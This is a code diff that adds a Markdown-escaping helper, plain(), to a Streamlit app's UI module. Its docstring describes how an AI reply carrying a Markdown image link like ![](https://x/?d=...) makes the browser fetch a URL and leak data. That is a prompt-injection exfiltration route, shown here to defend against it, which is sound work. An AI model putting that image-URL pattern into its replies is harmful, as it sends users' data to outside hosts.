@@ -7,6 +7,7 @@ No external images, so the app works offline.
 from __future__ import annotations
 
 import base64
+import re
 
 # Layout palette from the teal career-planner deck (cream paper, teal hills, ink lines);
 # icon fills stay bright like the pink-purple deck's colourful icons.
@@ -310,3 +311,14 @@ def phase_html(key: str, n: int) -> str:
 def banner_html(title: str, sub: str) -> str:
     return (f'<div class="banner">{icon("done", 72)}<div><div class="b-title">{title}</div>'
             f'<div class="lead" style="margin:0">{sub}</div></div></div>')
+
+
+def plain(s) -> str:
+    """Fix 3: make AI- or catalogue-written text display as plain text in Streamlit.
+    As Markdown, a reply like ![](https://x/?d=...) makes the browser fetch that URL with no
+    click: a way for data to leave (the third leg of the lethal trifecta). Escaping also stops
+    "$5 ... $9" being drawn as maths. Bare URLs get a zero-width space so they are not links."""
+    s = re.sub(r"([\\`*_{}\[\]()+!<>|~$])", r"\\\1", str(s))
+    s = re.sub(r"(?i)\b(?:https?|ftp):/+|\bwww\.",
+               lambda m: m.group(0)[:-1] + "\u200b" + m.group(0)[-1], s)
+    return re.sub(r"^(\s*)#", r"\1\\#", s)                        # no headings
